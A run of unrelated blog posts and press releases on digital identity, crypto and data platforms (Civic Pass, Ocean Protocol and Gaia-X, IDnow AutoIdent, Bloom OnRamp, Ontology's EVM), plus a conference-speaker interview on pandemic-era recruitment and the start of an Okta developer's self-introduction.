Progress</a> was originally published in <a href="https://medium.com/h-o-l-o">HOLO</a> on Medium, where people are continuing the conversation by highlighting and responding to this story.</p>

<p>During the third quarter, the entire crypto space was abuzz, and Civic was no exception. The quarter was marked by strong performances, especially from Bitcoin, which is the best <a href="https://finance.yahoo.com/news/bitcoin-q3-performance-cements-status-173555550.html">performing asset</a> this year, beating both stocks and commodities. NFT investment also <a href="https://www.reuters.com/technology/nft-sales-surge-107-bln-q3-crypto-asset-frenzy-hits-new-highs-2021-10-04/">reached new heights</a> as a flood of sales reached $10.7B during the quarter. And, FATF, the regulatory entity that sets global standards for cryptocurrency, <a href="https://www.fatf-gafi.org/publications/fatfrecommendations/documents/second-12-month-review-virtual-assets-vasps.html">issued its 12-month review</a> of revised standards on virtual assets, clearing the way for countries to codify and enforce new standards.</p>



<p>Key Milestones</p>



<p>Civic has always been ahead of the curve when it comes to decentralization and identity verification. As signals from regulators became stronger over the summer, we understood quickly from our clients and prospective clients that new permissioning tools for DeFi were needed to respond to these dynamic compliance requirements. We accommodated by building a DeFi product, called <a href="https://www.civic.com/solutions/civic-pass/">Civic Pass</a>.</p>



<p>In September, we <a href="https://www.civic.com/blog/solrise-civic-first-permissioned-dex-on-solana/">partnered with Solrise Finance</a> to announce the first on-chain decentralized exchange on Solana, Solrise DEX Pro, with permissioned access based on digital identity. Civic provides a KYC solution, through Civic Pass, that a dApp provider can use as an input to their compliance program. Solrise DEX Pro uses Civic Pass to determine which participants meet their rigorous standards for verification prior to allowing them the ability to trade. From Solrise DEX Pro, users are guided to use Civic’s identity verification technology solution. Once the user has completed the Civic Pass screening process, Solrise DEX Pro uses the results of the screening to allow trades on the DEX. The underlying technology for this product comes from Identity.com.</p>



<p>During the third quarter, we also <a href="https://www.civic.com/blog/black-fire-innovation-age-verification-vending-machine/">partnered with Black Fire Innovation</a>, the hospitality technology hub created by Caesars Entertainment, Inc., and the University of Nevada, Las Vegas (UNLV), to launch a vending machine demo using Age Verification by Civic. The technology is based on Identity.com’s open source identity verification ecosystem and is strategically located where advanced gaming and hospitality technology are developed.</p>



<p>The summer heralded new hires and promotions as the company repositioned itself for growth. Most importantly, our co-founder Vinny Lingham moved into a new role as Chairman of the Board at Civic, and <a href="https://www.civic.com/blog/new-board-member-maja-vujinovic/">promoted Civic’s new CEO</a>, Chris Hart, from his position as COO, a role he held for three years. We also <a href="https://www.civic.com/blog/new-board-member-maja-vujinovic/">gained a new board member</a>, Maja Vujinovic, who previously led blockchain as a CIO at GE, and has already made a tremendous strategic impact on our company’s direction. We also added a director of risk and compliance to our team, Chis Harding, who has already <a href="https://cointelegraph.com/news/defi-regulation-must-not-kill-the-values-behind-decentralization">penned an op-ed in Cointelegraph</a>.</p>



<p>Civic in the News</p>



<p>Civic gained its share of media attention over the summer with a total online readership of 332M. Our new CEO, Chris Hart, shared thoughts on the identity verification industry at the <a href="https://www.youtube.com/watch?v=Nq7aJtoDr1c">ReImagine Conference</a>, on the <a href="https://www.youtube.com/watch?v=qgTXz7pYMIM">Crypto Coin Show</a>, and on <a href="https://www.securities.io/chris-hart-chief-operating-officer-at-civic-interview-series/">Securities.io</a>, while our previous CEO, Vinny Lingham, shared insight with <a href="https://www.theinformation.com/articles/the-don-t-kill-crypto-billboard-the-rise-of-crypto-compliance-startups">The Information</a>. Our new head of risk and compliance, Chris Harding also introduced himself to <a href="https://medium.com/authority-magazine/the-future-is-now-christopher-harding-of-civic-technologies-on-how-their-technological-innovation-7397ef2a9a64">Authority Magazine</a>.</p>



<p>Our partnership with Black Fire Innovation garnered unique features in <a href="https://www.vendingtimes.com/articles/age-verification-taps-blockchain-to-protect-privacy-for-self-service/">Vending Times</a>, <a href="https://thespoon.tech/civic-technologies-powers-age-verification-tech-in-new-vending-machine/">The Spoon</a> and <a href="https://www.biometricupdate.com/202108/biometric-booze-vending-machine-verifies-buyers-age-but-only-if-they-have-the-app">Biometric Update</a>, and our press release reached 83M+ viewers. Additionally, our partnership with Solrise Finance received 14 pieces of unique coverage, including a piece in <a href="https://www.coindesk.com/business/2021/09/23/why-civic-is-building-defi-identity-tools-on-solana/">CoinDesk</a>, <a href="https://coinmarketcap.com/headlines/news/Solrise-and-Civic-Launch-First-Permissioned-DEX-on-Solana/">CoinMarketCap</a>, <a href="https://u.today/first-ever-solanas-permissioned-dex-unveiled-by-solrise-finance-and-civic-technologies-details">U.Today</a>, <a href="https://invezz.com/news/2021/09/23/civic-technologies-and-solrise-finance-introduce-first-on-chain-dex-on-solana/">Invezz</a> and other publications. The press release reached a total potential audience of 77M.</p>



<p>Coming Soon</p>



<p>With the strong performance of NFTs this summer and into the fall, we’ve expanded our <a href="https://www.civic.com/solutions/civic-pass-for-nfts/">Civic Pass offering to NFTs</a>, so you can expect to hear more announcements on that front. We’re also working hard to make Civic Pass available across chains and will be sharing more news about partnerships on that front. Finally, we’ll be paying close attention to upcoming regulations that affect our clients and responding to their needs to make our products better.</p>

 Building towards a decentralized European Data Economy: A Minimal Viable Gaia-X (MVG) powered by Ocean&nbsp;Protocol <p>Representatives from business, science, and politics on a European level are creating a proposal of a European data infrastructure for the next generation: a secure, federated system that meets the highest standards of digital sovereignty and promotes innovation. Gaia-X is the cradle of an open, transparent, decentralized digital ecosystem, where data and services can be made available, collated, shared, and monetized in an environment of trust. <a href="https://www.gaia-x.eu/members">More than 300 organizations</a> and over 2500 contributors are already supporting Gaia-X.</p><p>Private data can help with the research and development of life-altering innovations in both science and technology. The more data available — from a multitude of sources, the more accurate the predictions of Artificial Intelligence (AI) models&nbsp;become.</p><p>However, companies still hesitate to share and sell their private data, as it has traditionally had unpredictable risks, such as data breaches and related liability. This is one reason why data often remains locked, because of concerns over security, privacy, and trust. Thus, even today, data silos are exploited by only a few companies, which results in an inaccessible and intransparent data&nbsp;market.</p><p>Gaia-X tries to solve these problems and shows that data sharing and monetization are possible without sacrificing data sovereignty, data protection, privacy, and European values. Ocean Protocol offers a technical solution to these problems in that it enables creating open, transparent, and decentralized data&nbsp;markets.</p><p>As data has the potential to become the single most valuable asset of our time, Gaia-X will significantly contribute to the economic welfare of all Europeans in the coming&nbsp;decades.</p><p>“​​Ocean Protocol is working with Gaia-X to help deliver goals for the development of an efficient, competitive, secure and trustworthy federation of data infrastructure and service providers for Europe.” — Trent McConaghy, Ocean Protocol&nbsp;founder.</p><p>“Together with industry-leading collaborators, we continue jointly innovating and engineering a European cloud infrastructure.” — Frederic Schwill, Tech Lead at deltaDAO&nbsp;AG.</p><p>Ocean Protocol provides core functionalities for the Gaia-X federated services leading to a Minimal Viable Gaia-X (MVG) available today. It enables services to interact with each other and be used like lego bricks to build new and more complex products.</p> Using Open Source Distributed Ledger Technology to build a European Data&nbsp;Economy <p>The very first Gaia-X Hackathon took place in August 2021. More than 250 participants from over 25 countries worked on different components of a Minimal Viable Gaia-X, sponsored by Ocean Protocol, deltaDAO, <a href="https://blog.oceanprotocol.com/ocean-datarella-and-the-future-of-mobility-data-sovereignty-with-gaia-x-95bdf8f89cc4">Datarella</a>, Google Cloud, and&nbsp;more.</p><p>deltaDAO AG co-organized the Hackathon, led the “Compute-to-Data” stream, and presented a Minimal Viable Gaia-X Demonstrator based on Ocean Protocol.</p><p>The Minimal Viable Gaia-X <a href="https://portal.minimal-gaia-x.eu/">Demonstrator</a> built by deltaDAO on top of Ocean/using Ocean tech stack is a Web3 interpretation of the Gaia-X Federation Services and Registry. deltaDAO demonstrated that Ocean Protocol provides most Gaia-X core functionality today, enabling a decentralized data economy in line with the Gaia-X&nbsp;vision.</p><p>Gaia-X Test&nbsp;Network</p><p>Ocean Protocol is blockchain agnostic. Hence, it works with any EVM-compatible Distributed Ledger. deltaDAO deployed a few additional components on the Gaia-X Test Network in preparation for the Hackathon, enabling Ocean Protocol to be seamlessly used within the Gaia-X ecosystem. If you want to try it, get your OCEAN test tokens&nbsp;<a href="https://faucet.gaiaxtestnet.oceanprotocol.com/">here</a>.</p><p>Gaia-X Portal powered by Ocean Protocol: A platform to find, publish and consume Data Services in the Gaia-X Test&nbsp;Network.</p><p><a href="https://portal.minimal-gaia-x.eu/">https://portal.minimal-gaia-x.eu/</a> |</p><p>GitHub: <a href="https://github.com/deltaDAO/Ocean-Market">https://github.com/deltaDAO/Ocean-Market</a></p><p>The Gaia-X Portal, developed by deltaDAO, is built on Ocean Protocol, as a trustless, decentralized, and privacy-preserving data and AI-sharing and monetization protocol. It connects data publishers and consumers, listing data services in the Gaia-X network. The Portal is fully open-source and you can try it&nbsp;<a href="https://github.com/deltaDAO/Ocean-Market">here</a>.</p><p>Any company or institution can adopt data portals. While fully customizable, all portals connect to the Gaia-X Test Network, enabling interoperability and cross-listing of Data Services by&nbsp;design.</p><p>Onboarding videos and tutorials</p><p>As most Hackathon participants were new to Web3, deltaDAO assembled an interactive onboarding tutorial. Try it yourself&nbsp;<a href="https://portal.minimal-gaia-x.eu/tutorial">here</a>.</p><p><a href="https://catalogue.minimal-gaia-x.eu/">Gaia-X Catalogue</a>: A tool to find Data Service Self-Descriptions in the Gaia-X Test&nbsp;Network.</p><p>deltaDAO’s Web3 interpretation of a Gaia-X Catalogue demonstrates a “Catalogue of Catalogues” based on Distributed Ledger Technology (DLT). It lists all data service self-descriptions in the Gaia-X Test network, offering an immutable ground truth to all network participants.</p><p>Self-Description Lifecycle Management</p><p>The Gaia-X Architecture document defines a lifecycle for all data self-descriptions. deltaDAO built a <a href="https://github.com/deltaDAO/Self-Description-Lifecycle-Management">basic lifecycle management tool</a> based on Ocean Protocol during the Hackathon.</p><p>Ocean’s Compute-to-Data</p><p>The Gaia-X Hackathon had a full stream dedicated to <a href="https://blog.oceanprotocol.com/ocean-protocol-launches-compute-to-data-efb89990ce1">Compute-to-Data</a>. A privacy-preserving data sharing and monetization approach to bring algorithms to the data instead of moving data&nbsp;around.</p><p>“Ocean Compute-to-Data is the response to solving the current tradeoff between the benefits of using private data and the risks of exposing it. Compute-to-Data lets data stay on-premise while allowing 3rd parties to run specific compute jobs on it, like building AI models. There are multitudes of applications in science, technology, and business contexts because the compute is sufficiently ‘aggregating’ or ‘anonymizing’ that the privacy risk is minimized,” explained Trent McConaghy, Ocean Protocol&nbsp;Founder.</p><p>“Ocean Compute-to-Data helps to make private data available for AI and business intelligence applications, while avoiding ‘data escapes’ and without the last-mile user seeing the private data directly,” remarks McConaghy. “It enables data marketplaces to buy and sell private data in a privacy-preserving fashion, for applications in healthcare, mobility, and more. We see Compute-to-Data as a new opportunity for companies to monetize and unlock their data&nbsp;assets.”</p><p>Compute-to-Data was the foundation for many third-party portals and industry use&nbsp;cases:</p><p>Third-party portals and industry use&nbsp;cases</p><p>deltaDAO created a satellite image service portal, enabling data monetization with Compute-to-Data. It allows running remote machine learning algorithms, generating insights and value on large Copernicus image datasets. The showcase uses open-source satellite images from Sentinel-1 SLC IW and Sentinel 2 L2A missions over the metropolitan area around Marseille, France. It provides insights into how resource-intensive machine learning algorithms can be applied to open-source data. Datasets and algorithms are available <a href="https://portal.minimal-gaia-x.eu/asset/did:op:9276BA792584245Df7f76A0cD96aBfB7dcFFC3bA">here</a>.</p><p>Not moving the data around enables new business models for the data owner, saving immense amounts of storage and bandwidth.</p><p>In addition, another demonstrator portal was created to showcase how machine learning can be used to <a href="https://portal.minimal-gaia-x.eu/asset/did:op:5F9217E8E3c7405C9D296aD63c0933cF5980F704">predict heat demand in data centers</a> depending on the weather. For training the ML model, historical heat demand data from data centers as well as the historical weather data from the location were used. This resulted in weather forecast data insights that could predict the future heat demand of the given data center location. The operator of the data center could then, for example, use this to optimize their infrastructure accordingly.</p><p>This demonstrator highlighted how different data sources can be combined to generate insights that can be used e.g. to save energy and run more efficient cloud&nbsp;systems.</p><p>Ocean Protocol tech stack &amp;&nbsp;Gaia-X</p><p>Ocean Protocol’s mission is to kickstart a Web3 Data Economy that reaches the world, giving power back to data owners and enabling people to capture value from data to better our&nbsp;world.</p><p>Ocean Protocol already supports a wide range of functionalities that the Gaia-X federated services (GXFS) aim to provide. It also works well with Self-Sovereign Identities (SSI) and Verifiable Credentials (VC). Ocean Protocol might allow the Gaia-X community and emerging European data economy to save years of development and integration time. The created Minimal Gaia-X (MVG) was one of the first steps to prove this&nbsp;claim.</p><p>The Ocean Protocol tech stack provides Gaia-X with the tools to build a decentralized network, completely open, transparent, interoperable, with no lock-in, and conformity and trust checked automatically.</p><p>1. Identity and Trust. Ocean Protocol relies on Self-Sovereign Identities (SSI) and works well with verifiable credentials (VC). It allows users to retain control of their identity and adds a new level of trust and security.</p><p>2. Federated Catalogue. Ocean Protocol metadata smart contracts provide a decentralized database and “ground truth” for all data asset self-descriptions. This includes a fully operational federated catalogue (FC) and inter-cataloguesynchronization on the application layer.</p><p>3. Sovereign Data Exchange. Ocean Protocol enables Data Contract Services (DCS) based on Smart Contracts. It enables providers and consumers to offer, negotiate and stipulate data contracts and execute data access rights transparently and securely. Compute-to-Data (CtD), as part of Ocean Protocol’s core features, allows data service providers to monetize their data while keeping ownership and&nbsp;control.</p><p>4. Data Exchange Logging. Using Blockchain, all transactions are verified, stored, and audited in an ordered, transparent, and trustless way, thus enabling the Data Exchange Logging Service&nbsp;(DELS).</p><p>5. Portal and Integration. A user-friendly tool to discover and interact with data assets allows for widespread adoption and acceptance of Gaia-X services. Ocean Protocol delivers an open-source, customizable web frontend and APIs to interact with it. Users can start publishing and consuming data services with not much more than a standard browser at their disposal.</p><p>6. Security and Privacy by Design. Ocean Protocol features security and privacy by design based on a trustless environment and SSI as a Blockchain application and protocol. It does not collect any more information about the participants than is needed to facilitate its services.</p> Towards a New Data&nbsp;Economy <p>Simplifying privacy compliance for organizations. Data ownership remains in the hands of the owners while enabling value creation. It makes any process involving private data compliant with the most restrictive data protection frameworks.</p><p>Creating new revenue streams. No matter how much and what kind, anyone who owns data can earn revenue by granting access to those willing to pay. This applies to individuals and organizations.</p><p>Unlocking data taps. The ability to monetize data introduces an incentive to share data. This increases the amount of data breaking free from silos, ready to be blended and transformed to create&nbsp;value.</p><p>Making data available. With more data available for Data and AI Scientists, data models will get more accurate, increasing the market value of data products. The ability to easily search and find data from a global corpus removes barriers and friction to match data supply and&nbsp;demand.</p><p>Liberalizing data workflows. With data and data services organized in markets, data science workflows can be redesigned from scratch. Market actors will be able to compete and collaborate on each activity in the value&nbsp;chain.</p><p>Seeding the New Data Economy. Data markets will be 100% liquified. While it is difficult to describe how the New Data Economy will behave, moving from an archaic ownership model to a completely liberalized economy is expected to drive disruption. The wave of change coming to data science and AI with the adoption of distributed ledger technology is likely to be as big as the one that came with the adoption of the internet.</p> Conclusion: Keep&nbsp;Building <p>“Having joined the Gaia-X AISBL recently, we at deltaDAO are excited to continue working towards a decentralized, self-sovereign, and privacy-preserving European Data Economy together.“, Kai Meinke, Business Lead at deltaDAO&nbsp;AG.</p><p>By embracing a collaborative, open, and transparent structure, Gaia-X actively asks for more contributors to build a European data infrastructure.

<p>Since our earliest days, we’ve been working on identity for credential verification, based on the open-source platform, Identity.com. The identity solutions that we’ve built since are diverse – everything from establishing your age, so that you can <a href="https://www.civic.com/blog/black-fire-innovation-age-verification-vending-machine/">get a beer out of a vending machine</a>, to facilitating KYC for DeFi applications. Most recently, we collaborated with <a href="https://solrise.finance/">Solrise Finance</a> on the launch of <a href="http://dex.solrise.finance/">Solrise Dex Pro</a>, the first permissioned DEX built on Solana, using a new product from Civic, called <a href="https://www.civic.com/solutions/civic-pass/">Civic Pass</a>.</p>



<p>Civic Developer Resources</p>



<p>Now, we’re making <a href="https://docs.civic.com/">Civic Pass available to developers everywhere</a>. The idea is that developers can plug Civic Pass into their platform and create an identity layer that allows for a permissioned dApp platform, be it a DEX, an NFT marketplace or mint, a metaverse, or who knows what else you’ll come up with.&nbsp;</p>



<p>Done thoughtfully, identity verification will drive a more trusted web3 ecosystem. For example, the way DEXs are currently designed and used locks out institutional players. These larger entities, which have the ability to bring a lot of liquidity to the market, cannot use DEXs due to counterparty risk. They need to meet regulatory requirements in order to keep their licenses.&nbsp;</p>



<p>Specifically, institutional players must not interact with individuals or organizations that are sanctioned from using regulated financial institutions or platforms. Failure to comply with Anti-Money Laundering, Counter Terrorism Financing regulations and other sanctions could result in prison time for individuals and colossal fines for participating firms.&nbsp;</p>



<p>We believe that this permissioning can and should be done on-chain and that it should be done in a privacy-first and privacy-focused way. Ultimately, it should be in the power of the individual user to share their identity or not, and they should do so only if they want to access tools and financial services that are really interesting to them. Our point of view is that composable identity on-chain is the next evolution of what is required to enable a web3 structure, whether it’s a DEX, AMM, NFT marketplace or lending protocol.</p>



<p>Civic Pass is our answer to this problem. With Civic Pass, many different identity elements may be permissioned. So, if for example, a lending protocol has different needs, or if a dApp in another country has a lower threshold for KYC requirements, these components may be configured as needed. Regulations are inevitable, and we need to ensure that the right systems are in place so that these nascent companies can quickly and painlessly adapt as regulations change.</p>



<p>Getting Started is Easy</p>



<p>Visit our <a href="https://docs.civic.com/">Developer Resources</a> and reach out to us once you are ready to start integrating. Our tools aim to make a permissioned identity layer more accessible to dApps. The guide outlines integration with projects built on Solana, but support for other chains is coming soon.&nbsp;</p>



<p>We’re Here to Support You&nbsp;</p>



<p>While we’re a small but mighty team, we’re committed to helping you integrate with Civic Pass. You can find us in the #dev channel on our <a href="https://discord.gg/FCTHTBwj5Z">Discord server</a>, and we’d love to answer your questions.</p>



<p>We look forward to seeing what you build and hope this guide helps to better understand the potential implementations and possible innovations that Civic Pass can offer to your dApps.</p>

<p>Federal Network Agency confirms IDnow AutoIdent as official identification method</p>
<p>Munich, October 14th 2021, the AutoIdent solution from IDnow, a leading platform-as-a-service specialist for identity verification, is listed with the German Federal Network Agency as an officially confirmed identification method. Following VideoIdent, the AI-supported, automated method for identity verification, has thus now also received official proof that it meets the applicable requirements of eIDAS, the VGV and the VDV.</p>
<p>Following the upcoming amendments to the German Telecommunications Act (TKG), this means that IDnow can then also provide telecommunications service providers with an automated identification process.</p>
<p>The official confirmation means that AutoIdent (as defined in Article 24 (1) litera d) of the eIDAS) brings with it the determination of equivalent security, in terms of reliability compared to personal presence. Thus, the IDnow Group is the only German provider with a total of six identification procedures confirmed by the Federal Network Agency.</p>
<p>“The confirmation by the Federal Network Agency that our AI-based solution, AutoIdent, complies with the applicable regulations can be a breakthrough for many companies, especially for the future of digitalization in Germany,” says Armin Bauer, Managing Director Technology and Co-Founder at IDnow. “Automated identification procedures ensure seamless processes without media disruption and increase cost efficiency. By modernizing laws that allow these procedures, many cases can be simplified and modernized in the future.”</p>
<p>This is an important step especially in view of the amendment to the Telecommunications Act (TKG) in December. The modernization of the TKG to implement the European Electronic Communications Code (EU Directive 2018/1972) implements adjustments in the areas of digital infrastructure expansion, consumer protection and public safety.</p>
<p>Furthermore, there is an innovation for identity verification. Until now, only methods involving human interaction, such as postal or video ID procedures, were permitted. The new TKG amendment, §171 (2), now also includes procedures that have been accredited by the Federal Network Agency through a conformity assessment body. A draft of a new order of the Federal Network Agency on identification procedures pursuant to §172 (2) sentence 3 TKG published on October 13, 2021, supplements this innovation by clearly including automatic video identification as a possible identification procedure within the scope of the requirements regulated in the order. For telecommunications providers, this brings great advantages, as they can also use confirmed AI-based solutions. These enable a seamless on-boarding process, which can be done without disruption. This not only leads to a significantly higher conversion rate but also reduces costs through the automated process.</p>

<p><br>We’re thrilled to launch Bloom OnRamp, a new enterprise product that unlocks the full potential of DeFi, establishing a key piece of the infrastructure that will help the DeFi sector achieve compliance and, in turn, attain truly global and mainstream status. <br></p><p>Defi has experienced <a href="https://www.coindesk.com/markets/2021/04/29/defi-is-now-a-100b-sector/">massive growth</a> over the past year, topping both 1 million users and $100 billion in value for the first time. But this growth brings with it unforeseen challenges and limitations. Over the past month, regulators have <a href="https://www.wsj.com/articles/cryptos-defi-projects-arent-immune-to-regulation-secs-gensler-says-11629365401">warned</a> that a new wave of regulations was imminent as few DeFi companies have achieved compliance with KYC/AML and other applicable rules. <br></p><p>With the threat of regulations on the horizon, there is an opportunity in the DeFi space for projects to address compliance, risk assessment, and privacy in a new and more secure way<br></p><p>With OnRamp, enterprises can securely access reusable, verifiable credentials (VCs), all without requiring users to expose sensitive data. <br></p><p>For enterprises seeking KYC &amp; AML compliance, OnRamp offers ID verification, sanction screening and PEP Screening. Other identity credentials include phone number, email as well as social accounts like Facebook, Google, Linkedin and Twitter. <br></p><p>For enterprises seeking alternative data and better risk assessment, OnRamp offers secure access to bank account activity, balances and other financial signals. Future plans include the integration of traditional credit scores, utility bill payment history, and other alternative signals that could be helpful in determining creditworthiness.<br></p><p><br>Beyond OnRamp’s direct data integrations, the platform also supports the ability for third party credentials to enter the OnRamp platform via the WACI specification. This feature can enable unique localized use cases where financial infrastructure isn’t supporting local populations.<br></p><p>“We are excited to give enterprises the ability to leverage verifiable credentials for identity verification and risk assessment, all while respecting user privacy and mitigating the risk of data leaks” said Jace Hensley, Head of Platform at Bloom. “But what we are even more excited about is what our WACI integration enables. Now third party data sources around the world can enter the platform, giving the opportunity for people outside of the standard financial system to prove reliability and creditworthiness. This is a major step for DeFi to go global and truly expand financial inclusivity.”<br></p><p>Bloom’s <a href="https://onramp.co/">OnRamp</a> will be a key piece of infrastructure for DeFi companies, whether they are in launch or growth mode. The developer-friendly application includes no integration fees, no monthly minimums, no long term contracts, and flexible pricing. OnRamp reduces the barrier to entry for new builders, allows growing companies to expand, and most importantly, opens the door a bit wider for those who deserve access to the decentralized finance markets.<br></p><p>Learn how Bloom is helping DeFi with compliance and growing beyond collateralized lending, all while prioritizing user privacy.<br><br></p>

 A primer on Virtual Machines and Ontology’s Ethereum Virtual&nbsp;Machine. <p>As we move towards Web3, the next iteration of the internet, there has been a lot of talk about the benefits of interoperability and the need to connect different ecosystems and blockchains that currently operate in silos. Virtual Machines (VMs) are playing a big role in this. Haven’t heard of them? Never fear! We recently did a <a href="https://twitter.com/OntologyNetwork/status/1443893453495078934">tweet series</a> explaining their benefits, specifically related to Ethereum Virtual Machines. Check out the post below for a full&nbsp;recap!</p><p>A VM is a computer that runs on the blockchain and allows smart contracts from multiple sources to interact with one another. A smart contract is simply an agreement, expressed as code, executed on the blockchain, and the language it uses is blockchain platform-specific. To run smart contracts on different blockchain platforms, we need VMs to allow smart contracts written in one language to run another blockchain which saves time and costs compared to rewriting and testing new smart contracts or even requiring developers to learn a new programming language.</p><p>Imagine you’re a decentralized application (dApp) developer who has just launched an app on a leading public blockchain platform after months of research and coding. The number of users has skyrocketed since the dApp’s launch. Instead of becoming complacent, you begin to think about what’s next. You might consider moving the dApp to another blockchain platform to explore new opportunities and grow your user base. That’s where VMs come in. They help developers to instantly integrate their dApps into different platforms with a programming language they are already familiar with. By giving developers access to networks, VMs facilitate decentralized ecosystems and give them more computing power. Developers can then leverage the networks they are connected to to create smart contracts and&nbsp;dApps.</p><p>Ontology already has its own VM, and also supports Wasm and NeoVM. This summer, we <a href="https://medium.com/ontologynetwork/mainnet-3rd-anniversary-special-ontologys-ethereum-virtual-machine-evm-debut-f92111436a8e">announced</a> that we had completed the development of our Ethereum Virtual Machine (EVM). The EVM is the most popular and widely used VM, supporting a huge variety of&nbsp;dApps.</p><p>Ontology’s EVM will bring many benefits to users&nbsp;by:</p>  Increasing interoperability between Ontology and Ethereum; developers will be able to seamlessly migrate assets between both blockchains.  Allowing users to access EVM-based projects deployed on Ontology, whilst enjoying lower gas fees and faster block production.  Enabling Ethereum developers to build using Ontology’s decentralized identity and data protocols.  Increase Ontology’s functionality by adding an Ethereum account system, Ethereum transaction types, and Web3&nbsp;APIs.  <p>Our EVM recently launched on TestNet and opened its EVM-compatible public beta for developers. To help refine our TestNet, we set up a <a href="https://medium.com/ontologynetwork/ontologys-evm-testnet-officially-deployed-now-opening-evm-compatible-public-beta-to-developers-6dddc2bdd764">bug bounty</a> with Slow Mist, which allows people to earn rewards for identifying vulnerabilities, with a top prize of $12,000 of&nbsp;$ONG.</p><p>In addition to Ontology’s EVM TestNet, the Ontology Blockchain Explorer, Developer Documentation Center, and Ontology EVM-supported Web3 API are also being upgraded, which will incentivize Ethereum developers to deploy dApps on the TestNet. Developers can also use the Ontology Bridge to convert Ontology’s native OEP4 tokens to ORC20 tokens and add them to their MetaMask wallets and then deploy&nbsp;dApps.</p><p>We hope you’re excited for the full launch of our EVM and we look forward to sharing more updates. For now, if you’re interested in learning more about our EVM development, you can check out our Medium series: “<a href="https://medium.com/ontologynetwork/everything-you-need-to-know-about-ontology-evm-contract-development-part-1-network-details-2095f6e141e5">Everything You Need To Know About Ontology EVM Contract Development</a>”.</p> Want more Ontology? <p>Learn more about our decentralized data and identity solutions on our <a href="https://ont.io/">website</a> and official <a href="https://twitter.com/OntologyNetwork">Twitter</a> account.

  <p>by <a href="https://www.kuppingercole.com/team/suess">Fabian Süß</a></p><p>Robindro Ullah, CEO at Trendence Institut will discuss the <a href="https://www.kuppingercole.com/sessions/4914">The Impact of a Global Pandemic on Peoples Job Mindsets</a> on Wednesday, November 10 from 17:00 pm to 17:20 pm at <a href="https://www.kuppingercole.com/events/csls2021" title="Cybersecurity Leadership Summit 2021">Cybersecurity Leadership Summit 2021</a>.</p>
<p>To give you a sneak preview of what to expect, we asked Robindro some questions about his presentation.</p>
  
 Why has recruitment today never been so easy and hard at the same time? 
<p>This is a very good question, because on the one hand, we clearly see in our data, for example, that direct search or active sourcing was less used by companies, which is obviously because they have less job openings to fill. And, for example, also everything around the recruitment process was also easier to access, like video calls or virtual onboarding, and all that stuff. It didn't take so much time to do things like that, where in the past you had to travel to an employer to do an interview or a case study or something. Everything went online. So, talent was more accessible than before. On the other hand, the requirements of talent increased, like more people were looking for secure jobs or something we called job security. And another thing, for example, which was very prominent in Germany, was that more and more talents were looking for essential jobs, or at least they wanted to work in an essential environment. Like for example, we didn't ask the question before the pandemic, but during the past year, it was like every second person said that if they change or if they switch jobs, they will definitely look especially for essential jobs or jobs in an essential field.</p>
 How has the pandemic changed people's mindset about jobs in the last 1.5 years? 
<p>This is a difficult question. With our surveys and the data we are gathering we tried to look into the mindsets of people to get a clear picture of what they are thinking now. Obviously, as I said before, we have a shift in the direction of essential jobs or essential fields. So, till now, we are not 100 percent clear whether this is a shift which is based on more job security, because people think that an essential job is more secure, or is it because they thought about their life and the things they are doing and whether it is really something which matters, or is it essential for the society? And so, this could also be a reason why there's a shift in the direction of essential. In Germany especially, we also had, for example, a shift in the direction of government jobs or jobs in the public sector. This is also something which could be based on more job security, as well as on a shift in the mindset. In general, we can see that work/life balance or as we call it sometimes also work/life blending got more and more important during the pandemic and the focus on the family itself.</p>
 What distinguishes IT expert recruitment from the search of other professional fields? 
<p>This is a nice question, and a lot of our customers ask us how to approach IT experts, and is this completely different to all other searches they do or all other jobs that they have to fill? If you look at it from a more modern way of recruitment, you have to admit that every target group you are trying to access, you have to access individually. So, from this point of view of modern recruitment, IT experts, of course, they have to be approached individually, but it's not different from other target groups, because nowadays you have to approach every target group in a very individual way. What especially in the field of IT is harder or more difficult is the fact that they are approached a lot, like they get offers all the time, every day. So, you have to be more creative in comparison to other target groups, and you have to find other ways to approach them.</p>
<p>The highways to these talents, they are frequent. A lot of companies use those ways like LinkedIn or in in the German-speaking area, Xing. So, you have to be more creative and think about other ways to approach this talent. And of course, you have to consider the requirements they have. For example, in our data, we can clearly see that remote work has a different status or it has a different impact on this target group than on others. They have higher requirements on the topic of remote work. For example, companies who have rules like you can work two days a week from home, also after our crisis. So, in future, this is something which would not be enough for IT experts. Because IT experts, in general say at least it should be 3.5 days a week I can use remote work and not just two days.</p>
 Could you give us a sneak peek into your Keynote: “The impact of a global pandemic on people’s job mindsets”? 
<p>In my keynote, I want to present to you some of the data we collected during the last one and half years, what we did in the very beginning of this pandemic was that we started a monthly survey in Germany. And from this data, we got a lot of insights I want to present to you. Especially those insights which give a little bit of insight into the mindsets of the people. And for example, one insight I was very - not shocked, but surprised about, was the fact that, for example, the social media usage in terms of career and job search changed a little bit.</p>
<p>Before we had the big players who got a lot of traffic. And now more and more small players get more traffic, like very small networks in terms of career and job topics like TikTok, for example, came up in the professional area, which I've never seen before. TikTok is on the market from I think from 2015 on, or 2017 in the Western world too. So a lot changed due to the pandemic. And we have good reason to believe that. for example, one of the reasons is that people have more time. They were able to spend more time thinking about which social networks fit their needs best.</p>

  <p>Hello Oktaverse!</p>

<p>So finally, I have landed at Okta on my second attempt 😉. I’m so excited about this new chapter in my career journey and can’t wait to see what’s in store. But first, introductions.</p>

<p></p>

 Who am I 

<p>I’m from the south of India, a village in Kerala to be specific, but I grew up in Chennai since my parents moved there looking for work when I was 12. I like to call myself a software engineer with a soldering iron. That’s because I never intended to be in the IT industry. I wanted to be an astronomer, but that didn’t work out, so I wanted to get into robotics. I got myself an engineering degree in electronics and electrical engineering to pursue that, but apparently, the universe had different plans.</p>

<p>The recession of 2008 hit, and robotics companies in India weren’t hiring much. To make ends meet and repay my student loan, I applied to one of the biggest software companies in India with little to no hope. The only software experience I’d had at that point was the data-structures class (which I flunked once and had to retake) and a little bit of dabbling with JS and PHP when I ran a personal blog about modifying motorbikes. Surprisingly, I made the cut. Hence, I began my journey into software engineering with a boot camp provided by Tata Consultancy Services (TCS). That is when I realized I was pretty good at programming and I passed out of the boot camp as the top performer! I still love learning about astronomy and astrophysics, among other science subjects, and still ride a motorcycle 😄. I also love Linux and you can read <a href="https://deepu.tech/the-state-of-linux-on-desktops/">my take on the state of Linux</a> if you are interested.</p>

 What I’ve done so far 

